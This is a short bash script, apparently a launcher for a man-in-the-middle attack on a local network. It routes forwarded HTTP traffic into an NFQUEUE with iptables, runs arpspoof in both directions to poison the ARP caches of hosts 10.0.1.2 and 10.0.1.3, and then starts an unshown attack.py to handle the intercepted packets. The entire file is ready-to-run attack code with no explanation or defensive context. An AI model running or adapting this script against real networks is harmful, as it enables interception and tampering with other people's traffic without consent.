#!/bin/bash

iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1
./arpspoof -g 10.0.1.2 10.0.1.3
./arpspoof -g 10.0.1.3 10.0.1.2
python3 attack.py
